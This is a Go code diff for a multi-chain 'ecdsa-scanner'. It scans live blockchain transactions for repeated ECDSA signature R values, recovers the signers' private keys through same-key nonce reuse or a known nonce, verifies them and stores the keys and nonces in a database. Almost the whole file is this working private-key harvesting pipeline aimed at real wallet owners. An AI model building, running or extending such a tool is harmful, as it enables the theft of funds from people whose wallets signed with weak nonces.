@@ -8,83 +8,74 @@ import (
 	"sync"
 	"time"
 
+	"github.com/ethereum/go-ethereum/common"
 	"github.com/ethereum/go-ethereum/common/hexutil"
+	"github.com/ethereum/go-ethereum/core/types"
+	"github.com/ethereum/go-ethereum/ethclient"
 	"github.com/ethereum/go-ethereum/rpc"
 
 	"ecdsa-scanner/internal/config"
 	"ecdsa-scanner/internal/db"
 	"ecdsa-scanner/internal/logger"
 	"ecdsa-scanner/internal/recovery"
-	"ecdsa-scanner/internal/retry"
 )
 
 // RPCTransaction represents a transaction from the RPC
 type RPCTransaction struct {
-	Hash  string `json:"hash"`
-	From  string `json:"from"`
-	To    string `json:"to"`
-	V     string `json:"v"`
-	R     string `json:"r"`
-	S     string `json:"s"`
+	Hash string `json:"hash"`
+	From string `json:"from"`
+	R    string `json:"r"`
+	S    string `json:"s"`
+	V    string `json:"v"`
 }
 
 // RPCBlock represents a block from the RPC
 type RPCBlock struct {
 	Number       string           `json:"number"`
-	Hash         string           `json:"hash"`
-	Timestamp    string           `json:"timestamp"`
 	Transactions []RPCTransaction `json:"transactions"`
+}
+
+// CollisionEvent is sent when a collision is detected
+type CollisionEvent struct {
+	RValue      string
+	NewTxHash   string
+	NewChainID  int
+	NewAddress  string
+	FirstTxRef  db.TxRef
 }
 
 // ChainStats holds statistics for a single chain
 type ChainStats struct {
-	Chain          string `json:"chain"`
-	StartBlock     uint64 `json:"start_block"`
-	CurrentBlock   uint64 `json:"current_block"`
-	LatestBlock    uint64 `json:"latest_block"`
-	TxScanned      uint64 `json:"tx_scanned"`
-	Running        bool   `json:"running"`
-	ErrorCount     int    `json:"error_count"`
-	CircuitOpen    bool   `json:"circuit_open"`
-	LastError      string `json:"last_error,omitempty"`
-	LastErrorTime  string `json:"last_error_time,omitempty"`
+	Chain        string `json:"chain"`
+	ChainID      int    `json:"chain_id"`
+	CurrentBlock uint64 `json:"current_block"`
+	LatestBlock  uint64 `json:"latest_block"`
+	Running      bool   `json:"running"`
+	ErrorCount   int    `json:"error_count"`
 }
 
 // ChainScanner handles scanning for a single chain
 type ChainScanner struct {
-	config         config.ChainConfig
-	client         *rpc.Client
-	running        bool
-	stopChan       chan struct{}
-	mu             sync.Mutex
-	stats          ChainStats
-	circuitBreaker *retry.CircuitBreaker
-	retryConfig    retry.Config
-	errorCount     int
-	lastError      string
-	lastErrorTime  time.Time
-}
-
-// RecoveryCandidate holds info for key recovery
-type RecoveryCandidate struct {
-	RValue  string
-	Address string
-	Chain   string
-	TxHash1 string
-	TxHash2 string
+	config    config.ChainConfig
+	client    *rpc.Client
+	ethClient *ethclient.Client
+	running   bool
+	stopChan  chan struct{}
+	mu        sync.Mutex
+	stats     ChainStats
+	errCount  int
 }
 
 // Scanner coordinates scanning across all chains
 type Scanner struct {
 	db              db.Database
 	logger          *logger.Logger
-	chainScanners   map[string]*ChainScanner
+	chainScanners   map[int]*ChainScanner // keyed by chainID
 	mu              sync.RWMutex
-	writeQueue      chan db.Signature
-	recoveryQueue   chan RecoveryCandidate
-	writeErrors     int
+	collisionChan   chan CollisionEvent
 	recoveryEnabled bool
 	ankrAPIKey      string
+	systemAddresses map[string]bool
 }
 
 // New creates a new Scanner
@@ -92,18 +83,15 @@ func New(database db.Database, log *logger.Logger, ankrAPIKey string) (*Scanner,
 	s := &Scanner{
 		db:              database,
 		logger:          log,
-		chainScanners:   make(map[string]*ChainScanner),
-		writeQueue:      make(chan db.Signature, 10000),
-		recoveryQueue:   make(chan RecoveryCandidate, 100),
+		chainScanners:   make(map[int]*ChainScanner),
+		collisionChan:   make(chan CollisionEvent, 1000),
 		recoveryEnabled: true,
 		ankrAPIKey:      ankrAPIKey,
+		systemAddresses: config.SystemAddresses(),
 	}
 
-	// Start batch writer
-	go s.batchWriter()
-
-	// Start recovery worker
-	go s.recoveryWorker()
+	// Start collision processor
+	go s.processCollisions()
 
 	// Initialize chain scanners
 	for _, cfg := range config.DefaultChains() {
@@ -111,55 +99,57 @@ func New(database db.Database, log *logger.Logger, ankrAPIKey string) (*Scanner,
 			continue
 		}
 
-		rpcURL := cfg.RPCURL
-		if ankrAPIKey != "" && strings.Contains(rpcURL, "ankr.com") {
-			rpcURL = rpcURL + "/" + ankrAPIKey
-		}
-
+		rpcURL := s.buildRPCURL(cfg.RPCURL)
 		client, err := rpc.Dial(rpcURL)
 		if err != nil {
-			log.Warn("[%s] Failed to connect: %v (will retry later)", cfg.Name, err)
-			// Still create scanner, it will retry connection
+			log.Warn("[%s] Failed to connect: %v", cfg.Name, err)
 		}
 
-		s.chainScanners[cfg.Name] = &ChainScanner{
-			config:         cfg,
-			client:         client,
-			stopChan:       make(chan struct{}),
-			stats:          ChainStats{Chain: cfg.Name},
-			circuitBreaker: retry.NewCircuitBreaker(5, 60*time.Second),
-			retryConfig: retry.Config{
-				MaxAttempts: 3,
-				BaseDelay:   time.Second,
-				MaxDelay:    30 * time.Second,
-			},
+		var ethClient *ethclient.Client
+		if client != nil {
+			ethClient = ethclient.NewClient(client)
+		}
+
+		s.chainScanners[cfg.ChainID] = &ChainScanner{
+			config:    cfg,
+			client:    client,
+			ethClient: ethClient,
+			stopChan:  make(chan struct{}),
+			stats:     ChainStats{Chain: cfg.Name, ChainID: cfg.ChainID},
 		}
 		if client != nil {
-			log.Info("[%s] Initialized scanner", cfg.Name)
+			log.Info("[%s] Initialized scanner (chainID=%d)", cfg.Name, cfg.ChainID)
 		}
 	}
 
 	return s, nil
 }
 
+func (s *Scanner) buildRPCURL(baseURL string) string {
+	if s.ankrAPIKey != "" && strings.Contains(baseURL, "ankr.com") {
+		return baseURL + "/" + s.ankrAPIKey
+	}
+	return baseURL
+}
+
 // StartAll starts all chain scanners
 func (s *Scanner) StartAll() {
-	for name := range s.chainScanners {
-		s.StartChain(name)
+	for chainID := range s.chainScanners {
+		s.StartChain(chainID)
 		time.Sleep(500 * time.Millisecond)
 	}
 }
 
 // StopAll stops all chain scanners
 func (s *Scanner) StopAll() {
-	for name := range s.chainScanners {
-		s.StopChain(name)
+	for chainID := range s.chainScanners {
+		s.StopChain(chainID)
 	}
 }
 
 // StartChain starts a specific chain scanner
-func (s *Scanner) StartChain(name string) {
-	cs, ok := s.chainScanners[name]
+func (s *Scanner) StartChain(chainID int) {
+	cs, ok := s.chainScanners[chainID]
 	if !ok {
 		return
 	}
@@ -177,8 +167,8 @@ func (s *Scanner) StartChain(name string) {
 }
 
 // StopChain stops a specific chain scanner
-func (s *Scanner) StopChain(name string) {
-	cs, ok := s.chainScanners[name]
+func (s *Scanner) StopChain(chainID int) {
+	cs, ok := s.chainScanners[chainID]
 	if !ok {
 		return
 	}
@@ -198,67 +188,31 @@ func (s *Scanner) GetChainStats() []ChainStats {
 	var stats []ChainStats
 	for _, cs := range s.chainScanners {
 		cs.mu.Lock()
-		chainStats := cs.stats
-		chainStats.Running = cs.running
-		chainStats.ErrorCount = cs.errorCount
-		chainStats.CircuitOpen = cs.circuitBreaker.IsOpen()
-		chainStats.LastError = cs.lastError
-		if !cs.lastErrorTime.IsZero() {
-			chainStats.LastErrorTime = cs.lastErrorTime.Format(time.RFC3339)
-		}
+		st := cs.stats
+		st.Running = cs.running
+		st.ErrorCount = cs.errCount
 		cs.mu.Unlock()
-		stats = append(stats, chainStats)
+		stats = append(stats, st)
 	}
 	return stats
-}
-
-// GetTotalTxScanned returns total transactions scanned across all chains
-func (s *Scanner) GetTotalTxScanned() uint64 {
-	var total uint64
-	for _, cs := range s.chainScanners {
-		cs.mu.Lock()
-		total += cs.stats.TxScanned
-		cs.mu.Unlock()
-	}
-	return total
-}
-
-func (s *Scanner) recordError(cs *ChainScanner, err error) {
-	cs.mu.Lock()
-	cs.errorCount++
-	cs.lastError = err.Error()
-	cs.lastErrorTime = time.Now()
-	cs.circuitBreaker.RecordFailure()
-	cs.mu.Unlock()
-}
-
-func (s *Scanner) recordSuccess(cs *ChainScanner) {
-	cs.mu.Lock()
-	cs.circuitBreaker.RecordSuccess()
-	cs.mu.Unlock()
 }
 
 func (s *Scanner) scanLoop(cs *ChainScanner) {
 	ctx := context.Background()
 	chainName := cs.config.Name
+	chainID := cs.config.ChainID
 
-	// Ensure we have a client connection
 	if cs.client == nil {
 		if err := s.reconnect(cs); err != nil {
-			s.logger.Error("[%s] Failed to establish initial connection: %v", chainName, err)
+			s.logger.Error("[%s] Failed to connect: %v", chainName, err)
 			return
 		}
 	}
 
 	// Get last scanned block
-	lastBlock, err := s.db.GetLastBlock(ctx, chainName)
-	if err != nil {
-		s.logger.Warn("[%s] Failed to get last block from DB: %v", chainName, err)
-	}
-
-	// If no previous scan, start from recent blocks
+	lastBlock, _ := s.db.GetLastBlock(ctx, chainID)
 	if lastBlock == 0 {
-		latestBlock, err := s.getLatestBlockWithRetry(cs, ctx)
+		latestBlock, err := s.getLatestBlock(cs, ctx)
 		if err != nil {
 			s.logger.Error("[%s] Failed to get latest block: %v", chainName, err)
 			return
@@ -266,18 +220,7 @@ func (s *Scanner) scanLoop(cs *ChainScanner) {
 		lastBlock = latestBlock - 1000
 	}
 
-	// Load existing transaction count
-	initialCount, _ := s.db.GetChainTxCount(ctx, chainName)
-
-	cs.mu.Lock()
-	cs.stats.StartBlock = lastBlock + 1
-	cs.stats.TxScanned = initialCount
-	cs.mu.Unlock()
-
 	s.logger.Info("[%s] Starting scan from block %d", chainName, lastBlock+1)
-
-	consecutiveErrors := 0
-	maxConsecutiveErrors := 10
 
 	for {
 		select {
@@ -287,35 +230,17 @@ func (s *Scanner) scanLoop(cs *ChainScanner) {
 		default:
 		}
 
-		// Check circuit breaker
-		if !cs.circuitBreaker.Allow() {
-			s.logger.Warn("[%s] Circuit breaker open, waiting...", chainName)
-			time.Sleep(10 * time.Second)
-			continue
-		}
-
-		latestBlock, err := s.getLatestBlockWithRetry(cs, ctx)
+		latestBlock, err := s.getLatestBlock(cs, ctx)
 		if err != nil {
-			s.recordError(cs, err)
-			consecutiveErrors++
-			s.logger.Error("[%s] Failed to get latest block: %v (consecutive: %d)",
-				chainName, err, consecutiveErrors)
-
-			if consecutiveErrors >= maxConsecutiveErrors {
-				s.logger.Error("[%s] Too many consecutive errors, attempting reconnect", chainName)
-				if err := s.reconnect(cs); err != nil {
-					s.logger.Error("[%s] Reconnect failed: %v", chainName, err)
-				}
-				consecutiveErrors = 0
-			}
-
+			cs.mu.Lock()
+			cs.errCount++
+			cs.mu.Unlock()
 			time.Sleep(5 * time.Second)
 			continue
 		}
 
 		cs.mu.Lock()
 		cs.stats.LatestBlock = latestBlock
-		cs.stats.Running = true
 		cs.mu.Unlock()
 
 		if lastBlock >= latestBlock {
@@ -324,49 +249,38 @@ func (s *Scanner) scanLoop(cs *ChainScanner) {
 		}
 
 		nextBlock := lastBlock + 1
-		count, err := s.scanBlockWithRetry(cs, ctx, nextBlock)
-		if err != nil {
-			s.recordError(cs, err)
-			consecutiveErrors++
+		if err := s.scanBlock(cs, ctx, nextBlock); err != nil {
+			cs.mu.Lock()
+			cs.errCount++
+			cs.mu.Unlock()
 			s.logger.Error("[%s] Failed to scan block %d: %v", chainName, nextBlock, err)
 			time.Sleep(2 * time.Second)
 			continue
 		}
 
-		// Success - reset error counter
-		s.recordSuccess(cs)
-		consecutiveErrors = 0
-
 		cs.mu.Lock()
 		cs.stats.CurrentBlock = nextBlock
-		cs.stats.TxScanned += uint64(count)
 		cs.mu.Unlock()
 
 		lastBlock = nextBlock
 
-		// Save state every 100 blocks
 		if nextBlock%100 == 0 {
-			if err := s.db.SaveLastBlock(ctx, chainName, nextBlock); err != nil {
-				s.logger.Warn("[%s] Failed to save state: %v", chainName, err)
-			}
+			s.db.SaveLastBlock(ctx, chainID, nextBlock)
 		}
 
-		if nextBlock%500 == 0 {
-			s.logger.Info("[%s] Scanned block %d (%d txs), %d blocks behind",
-				chainName, nextBlock, count, latestBlock-nextBlock)
+		if nextBlock%1000 == 0 {
+			s.logger.Info("[%s] Block %d, %d behind", chainName, nextBlock, latestBlock-nextBlock)
 		}
 
-		time.Sleep(100 * time.Millisecond)
+		time.Sleep(50 * time.Millisecond)
 	}
 }
 
 func (s *Scanner) reconnect(cs *ChainScanner) error {
-	rpcURL := cs.config.RPCURL
-	// Note: We don't have access to ankrAPIKey here, but the URL was already built with it
-
+	rpcURL := s.buildRPCURL(cs.config.RPCURL)
 	client, err := rpc.Dial(rpcURL)
 	if err != nil {
-		return fmt.Errorf("failed to dial RPC: %w", err)
+		return err
 	}
 
 	cs.mu.Lock()
@@ -374,21 +288,16 @@ func (s *Scanner) reconnect(cs *ChainScanner) error {
 		cs.client.Close()
 	}
 	cs.client = client
+	cs.ethClient = ethclient.NewClient(client)
 	cs.mu.Unlock()
 
-	s.logger.Info("[%s] Reconnected to RPC", cs.config.Name)
+	s.logger.Info("[%s] Reconnected", cs.config.Name)
 	return nil
-}
-
-func (s *Scanner) getLatestBlockWithRetry(cs *ChainScanner, ctx context.Context) (uint64, error) {
-	return retry.DoWithResult(ctx, cs.retryConfig, func() (uint64, error) {
-		return s.getLatestBlock(cs, ctx)
-	})
 }
 
 func (s *Scanner) getLatestBlock(cs *ChainScanner, ctx context.Context) (uint64, error) {
 	if cs.client == nil {
-		return 0, fmt.Errorf("no RPC client connection")
+		return 0, fmt.Errorf("no client")
 	}
 
 	ctx, cancel := context.WithTimeout(ctx, 10*time.Second)
@@ -401,15 +310,9 @@ func (s *Scanner) getLatestBlock(cs *ChainScanner, ctx context.Context) (uint64,
 	return (*big.Int)(&blockNum).Uint64(), nil
 }
 
-func (s *Scanner) scanBlockWithRetry(cs *ChainScanner, ctx context.Context, blockNum uint64) (int, error) {
-	return retry.DoWithResult(ctx, cs.retryConfig, func() (int, error) {
-		return s.scanBlock(cs, ctx, blockNum)
-	})
-}
-
-func (s *Scanner) scanBlock(cs *ChainScanner, ctx context.Context, blockNum uint64) (int, error) {
+func (s *Scanner) scanBlock(cs *ChainScanner, ctx context.Context, blockNum uint64) error {
 	if cs.client == nil {
-		return 0, fmt.Errorf("no RPC client connection")
+		return fmt.Errorf("no client")
 	}
 
 	ctx, cancel := context.WithTimeout(ctx, 30*time.Second)
@@ -418,203 +321,295 @@ func (s *Scanner) scanBlock(cs *ChainScanner, ctx context.Context, blockNum uint
 	var block RPCBlock
 	blockNumHex := fmt.Sprintf("0x%x", blockNum)
 	if err := cs.client.CallContext(ctx, &block, "eth_getBlockByNumber", blockNumHex, true); err != nil {
-		return 0, err
+		return err
 	}
 
-	count := 0
 	for _, tx := range block.Transactions {
-		if tx.R == "" || tx.S == "" || tx.From == "" {
+		if tx.R == "" || tx.R == "0x0" || tx.From == "" {
+			continue
+		}
+		if s.systemAddresses[strings.ToLower(tx.From)] {
 			continue
 		}
 
-		select {
-		case s.writeQueue <- db.Signature{
-			Chain:       cs.config.Name,
-			BlockNumber: blockNum,
-			TxHash:      tx.Hash,
-			FromAddress: tx.From,
-			R:           tx.R,
-			S:           tx.S,
-			V:           tx.V,
-		}:
-			count++
-		default:
-			s.logger.Warn("[%s] Write queue full, dropping transaction", cs.config.Name)
+		// Check for collision
+		existing, isCollision, err := s.db.CheckAndInsertRValue(ctx,
+			strings.ToLower(tx.R), strings.ToLower(tx.Hash), cs.config.ChainID)
+		if err != nil {
+			s.logger.Warn("[%s] DB error: %v", cs.config.Name, err)
+			continue
 		}
-	}
 
-	return count, nil
-}
+		if isCollision {
+			// Record the collision
+			s.db.RecordCollision(ctx, strings.ToLower(tx.R), strings.ToLower(tx.Hash),
+				cs.config.ChainID, strings.ToLower(tx.From))
 
-func (s *Scanner) batchWriter() {
-	batch := make([]db.Signature, 0, 1000)
-	ticker := time.NewTicker(time.Second)
-	defer ticker.Stop()
-
-	for {
-		select {
-		case sig := <-s.writeQueue:
-			batch = append(batch, sig)
-			if len(batch) >= 1000 {
-				s.flushBatchAndRecover(batch)
-				batch = batch[:0]
-			}
-		case <-ticker.C:
-			if len(batch) > 0 {
-				s.flushBatchAndRecover(batch)
-				batch = batch[:0]
-			}
-		}
-	}
-}
-
-func (s *Scanner) flushBatchAndRecover(batch []db.Signature) {
-	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
-	defer cancel()
-
-	// Insert and find any duplicates
-	duplicates, err := s.db.InsertSignaturesAndFindDuplicates(ctx, batch)
-	if err != nil {
-		s.mu.Lock()
-		s.writeErrors++
-		s.mu.Unlock()
-		s.logger.Error("Failed to insert batch of %d signatures: %v", len(batch), err)
-		return
-	}
-
-	// Queue any same-key duplicates for recovery
-	if s.recoveryEnabled && len(duplicates) > 0 {
-		for _, dup := range duplicates {
-			if !dup.SameKey || len(dup.Entries) < 2 {
-				continue
-			}
-
-			candidate := RecoveryCandidate{
-				RValue:  dup.RValue,
-				Address: dup.Entries[0].Address,
-				Chain:   dup.Entries[0].Chain,
-				TxHash1: dup.Entries[0].TxHash,
-				TxHash2: dup.Entries[1].TxHash,
-			}
-
-			// Non-blocking send to recovery queue
+			// Queue for processing
 			select {
-			case s.recoveryQueue <- candidate:
-				s.logger.Info("[RECOVERY] Queued recovery for %s on %s (R=%s...)",
-					candidate.Address[:16]+"...", candidate.Chain, candidate.RValue[:18]+"...")
+			case s.collisionChan <- CollisionEvent{
+				RValue:     strings.ToLower(tx.R),
+				NewTxHash:  strings.ToLower(tx.Hash),
+				NewChainID: cs.config.ChainID,
+				NewAddress: strings.ToLower(tx.From),
+				FirstTxRef: *existing,
+			}:
 			default:
-				s.logger.Warn("[RECOVERY] Queue full, skipping recovery for %s", candidate.Address)
+				s.logger.Warn("Collision queue full")
 			}
 		}
 	}
+
+	return nil
 }
 
-// GetWriteErrors returns the number of batch write errors
-func (s *Scanner) GetWriteErrors() int {
-	s.mu.RLock()
-	defer s.mu.RUnlock()
-	return s.writeErrors
-}
-
-// GetRPCURL returns the RPC URL for a chain
-func (s *Scanner) GetRPCURL(chainName string) string {
-	cs, ok := s.chainScanners[chainName]
-	if !ok {
-		return ""
-	}
-	return cs.config.RPCURL
-}
-
-// getRPCURLWithKey returns the RPC URL with API key appended if needed
-func (s *Scanner) getRPCURLWithKey(chainName string) string {
-	for _, chain := range config.DefaultChains() {
-		if chain.Name == chainName {
-			rpcURL := chain.RPCURL
-			if s.ankrAPIKey != "" && strings.Contains(rpcURL, "ankr.com") {
-				rpcURL = rpcURL + "/" + s.ankrAPIKey
-			}
-			return rpcURL
+// processCollisions handles detected collisions
+func (s *Scanner) processCollisions() {
+	for event := range s.collisionChan {
+		if !s.recoveryEnabled {
+			continue
 		}
-	}
-	return ""
-}
-
-// recoveryWorker processes the recovery queue
-func (s *Scanner) recoveryWorker() {
-	for candidate := range s.recoveryQueue {
-		s.processRecovery(candidate)
+		s.handleCollision(event)
 	}
 }
 
-// processRecovery attempts to recover a private key from a duplicate R value
-func (s *Scanner) processRecovery(candidate RecoveryCandidate) {
+func (s *Scanner) handleCollision(event CollisionEvent) {
 	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
 	defer cancel()
 
-	// Double-check this key hasn't already been recovered
-	alreadyRecovered, err := s.db.IsKeyRecovered(ctx, candidate.Address, candidate.Chain)
+	s.logger.Info("[COLLISION] R=%s... TX1=%s (chain %d) TX2=%s (chain %d)",
+		event.RValue[:18], event.FirstTxRef.TxHash[:18], event.FirstTxRef.ChainID,
+		event.NewTxHash[:18], event.NewChainID)
+
+	// Fetch full transaction data from RPC
+	tx1Data, err := s.fetchTxData(ctx, event.FirstTxRef.TxHash, event.FirstTxRef.ChainID)
 	if err != nil {
-		s.logger.Warn("[RECOVERY] Failed to check recovery status for %s: %v", candidate.Address, err)
-		return
-	}
-	if alreadyRecovered {
-		s.logger.Info("[RECOVERY] Key for %s on %s already recovered, skipping", candidate.Address, candidate.Chain)
+		s.logger.Error("[COLLISION] Failed to fetch TX1: %v", err)
 		return
 	}
 
-	rpcURL := s.getRPCURLWithKey(candidate.Chain)
-	if rpcURL == "" {
-		s.logger.Warn("[RECOVERY] No RPC URL for chain %s", candidate.Chain)
-		return
-	}
-
-	s.logger.Info("[RECOVERY] Attempting key recovery for %s on %s", candidate.Address, candidate.Chain)
-	s.logger.Info("[RECOVERY]   TX1: %s", candidate.TxHash1)
-	s.logger.Info("[RECOVERY]   TX2: %s", candidate.TxHash2)
-
-	recoveredKey, err := recovery.RecoverPrivateKey(ctx, rpcURL, candidate.TxHash1, candidate.TxHash2)
+	tx2Data, err := s.fetchTxData(ctx, event.NewTxHash, event.NewChainID)
 	if err != nil {
-		s.logger.Error("[RECOVERY] Failed to recover key for %s: %v", candidate.Address, err)
+		s.logger.Error("[COLLISION] Failed to fetch TX2: %v", err)
 		return
 	}
 
-	// Verify the recovered address matches
-	if !strings.EqualFold(recoveredKey.Address, candidate.Address) {
-		s.logger.Error("[RECOVERY] Recovered address %s doesn't match expected %s",
-			recoveredKey.Address, candidate.Address)
+	// Check if same address (same-key reuse - directly recoverable)
+	if strings.EqualFold(tx1Data.From, tx2Data.From) {
+		s.logger.Info("[COLLISION] Same-key reuse detected for %s", tx1Data.From)
+		s.attemptSameKeyRecovery(ctx, event, tx1Data, tx2Data)
 		return
 	}
 
-	// Save to database
-	dbKey := &db.RecoveredKey{
-		Address:    recoveredKey.Address,
-		PrivateKey: recoveredKey.PrivateKey,
-		Chain:      candidate.Chain,
-		RValue:     recoveredKey.RValue,
-		TxHash1:    recoveredKey.TxHash1,
-		TxHash2:    recoveredKey.TxHash2,
-	}
-
-	if err := s.db.SaveRecoveredKey(ctx, dbKey); err != nil {
-		s.logger.Error("[RECOVERY] Failed to save recovered key for %s: %v", candidate.Address, err)
+	// Cross-key collision - check if we have a known nonce
+	knownNonce, err := s.db.GetRecoveredNonce(ctx, event.RValue)
+	if err == nil {
+		s.logger.Info("[COLLISION] Cross-key with known nonce - attempting recovery")
+		s.attemptCrossKeyRecoveryWithKnownNonce(ctx, event, tx2Data, knownNonce)
 		return
 	}
 
-	s.logger.Info("[RECOVERY] *** SUCCESS *** Recovered private key for %s on %s", candidate.Address, candidate.Chain)
-	s.logger.Info("[RECOVERY]   Private Key: %s...%s",
-		recoveredKey.PrivateKey[:10], recoveredKey.PrivateKey[len(recoveredKey.PrivateKey)-6:])
+	// Cross-key without known nonce - save as pending
+	s.logger.Info("[COLLISION] Cross-key collision (not yet solvable)")
+	s.savePendingComponent(ctx, event, tx1Data, tx2Data)
 }
 
-// SetRecoveryEnabled enables or disables automatic key recovery
+// TxData holds fetched transaction data needed for recovery
+type TxData struct {
+	Hash    string
+	ChainID int
+	From    string
+	Z       *big.Int // signing hash
+	R       *big.Int
+	S       *big.Int
+}
+
+func (s *Scanner) fetchTxData(ctx context.Context, txHash string, chainID int) (*TxData, error) {
+	chainCfg := config.ChainByID(chainID)
+	if chainCfg == nil {
+		return nil, fmt.Errorf("unknown chain ID %d", chainID)
+	}
+
+	rpcURL := s.buildRPCURL(chainCfg.RPCURL)
+	client, err := ethclient.DialContext(ctx, rpcURL)
+	if err != nil {
+		return nil, err
+	}
+	defer client.Close()
+
+	tx, _, err := client.TransactionByHash(ctx, common.HexToHash(txHash))
+	if err != nil {
+		return nil, err
+	}
+
+	chainIDBig, err := client.ChainID(ctx)
+	if err != nil {
+		return nil, err
+	}
+
+	signer := types.LatestSignerForChainID(chainIDBig)
+	from, err := types.Sender(signer, tx)
+	if err != nil {
+		return nil, err
+	}
+
+	z := signer.Hash(tx)
+	v, r, sVal := tx.RawSignatureValues()
+	_ = v
+
+	return &TxData{
+		Hash:    txHash,
+		ChainID: chainID,
+		From:    from.Hex(),
+		Z:       new(big.Int).SetBytes(z.Bytes()),
+		R:       r,
+		S:       sVal,
+	}, nil
+}
+
+func (s *Scanner) attemptSameKeyRecovery(ctx context.Context, event CollisionEvent, tx1, tx2 *TxData) {
+	// Check if already recovered
+	recovered, _ := s.db.IsKeyRecovered(ctx, tx1.From, tx1.ChainID)
+	if recovered {
+		s.logger.Info("[RECOVERY] Key already recovered for %s", tx1.From)
+		return
+	}
+
+	// Recover private key
+	privKey, err := recovery.RecoverFromSignatures(tx1.Z, tx1.R, tx1.S, tx2.Z, tx2.R, tx2.S)
+	if err != nil {
+		s.logger.Error("[RECOVERY] Failed: %v", err)
+		return
+	}
+
+	// Verify
+	if !recovery.VerifyPrivateKey(privKey, tx1.From) {
+		s.logger.Error("[RECOVERY] Verification failed - recovered key doesn't match address")
+		return
+	}
+
+	// Save key
+	keyID, err := s.db.SaveRecoveredKey(ctx, &db.RecoveredKey{
+		Address:    strings.ToLower(tx1.From),
+		PrivateKey: privKey,
+		ChainID:    tx1.ChainID,
+		ChainName:  config.ChainByID(tx1.ChainID).Name,
+		RValues:    []string{event.RValue},
+		TxHashes:   []string{tx1.Hash, tx2.Hash},
+	})
+	if err != nil {
+		s.logger.Error("[RECOVERY] Failed to save key: %v", err)
+		return
+	}
+
+	s.logger.Info("[RECOVERY] *** SUCCESS *** Recovered key for %s", tx1.From)
+
+	// Derive and save nonce for future cross-key recovery
+	nonce := recovery.DeriveNonce(tx1.Z, tx1.R, tx1.S, privKey)
+	s.db.SaveRecoveredNonce(ctx, &db.RecoveredNonce{
+		RValue:           event.RValue,
+		KValue:           nonce,
+		DerivedFromKeyID: keyID,
+	})
+
+	s.logger.Info("[RECOVERY] Saved nonce for R=%s...", event.RValue[:18])
+
+	// Check if this unlocks any pending components
+	s.checkPendingComponents(ctx, event.RValue, nonce)
+}
+
+func (s *Scanner) attemptCrossKeyRecoveryWithKnownNonce(ctx context.Context, event CollisionEvent, txData *TxData, nonce *db.RecoveredNonce) {
+	// Check if already recovered
+	recovered, _ := s.db.IsKeyRecovered(ctx, txData.From, txData.ChainID)
+	if recovered {
+		return
+	}
+
+	// Recover using known nonce
+	privKey, err := recovery.RecoverWithKnownNonce(txData.Z, txData.R, txData.S, nonce.KValue)
+	if err != nil {
+		s.logger.Error("[RECOVERY] Cross-key failed: %v", err)
+		return
+	}
+
+	if !recovery.VerifyPrivateKey(privKey, txData.From) {
+		s.logger.Error("[RECOVERY] Cross-key verification failed")
+		return
+	}
+
+	_, err = s.db.SaveRecoveredKey(ctx, &db.RecoveredKey{
+		Address:    strings.ToLower(txData.From),
+		PrivateKey: privKey,
+		ChainID:    txData.ChainID,
+		ChainName:  config.ChainByID(txData.ChainID).Name,
+		RValues:    []string{event.RValue},
+		TxHashes:   []string{txData.Hash},
+	})
+	if err != nil {
+		s.logger.Error("[RECOVERY] Failed to save key: %v", err)
+		return
+	}
+
+	s.logger.Info("[RECOVERY] *** SUCCESS (cross-key) *** Recovered key for %s", txData.From)
+}
+
+func (s *Scanner) savePendingComponent(ctx context.Context, event CollisionEvent, tx1, tx2 *TxData) {
+	comp := &db.PendingComponent{
+		RValues:   []string{event.RValue},
+		TxHashes:  []string{tx1.Hash, tx2.Hash},
+		Addresses: []string{tx1.From, tx2.From},
+		ChainIDs:  []int{tx1.ChainID, tx2.ChainID},
+		Equations: 2,
+		Unknowns:  3, // 2 keys + 1 nonce
+	}
+	s.db.SavePendingComponent(ctx, comp)
+}
+
+func (s *Scanner) checkPendingComponents(ctx context.Context, rValue string, nonce string) {
+	// Check if any pending components use this R value
+	comps, err := s.db.GetPendingComponents(ctx)
+	if err != nil {
+		return
+	}
+
+	for _, comp := range comps {
+		for _, r := range comp.RValues {
+			if r == rValue {
+				// This component now has a known nonce
+				s.logger.Info("[RECOVERY] Pending component now solvable")
+				// TODO: Implement general linear solver
+				// For now, we handle simple cases in the collision handler
+			}
+		}
+	}
+}
+
+// SetRecoveryEnabled enables/disables automatic recovery
 func (s *Scanner) SetRecoveryEnabled(enabled bool) {
 	s.mu.Lock()
 	defer s.mu.Unlock()
 	s.recoveryEnabled = enabled
 }
 
-// IsRecoveryEnabled returns whether automatic key recovery is enabled
+// IsRecoveryEnabled returns whether recovery is enabled
 func (s *Scanner) IsRecoveryEnabled() bool {
 	s.mu.RLock()
 	defer s.mu.RUnlock()
 	return s.recoveryEnabled
+}
+
+// StartChainByName starts a chain scanner by name
+func (s *Scanner) StartChainByName(name string) {
+	cfg := config.ChainByName(name)
+	if cfg != nil {
+		s.StartChain(cfg.ChainID)
+	}
+}
+
+// StopChainByName stops a chain scanner by name
+func (s *Scanner) StopChainByName(name string) {
+	cfg := config.ChainByName(name)
+	if cfg != nil {
+		s.StopChain(cfg.ChainID)
+	}
 }
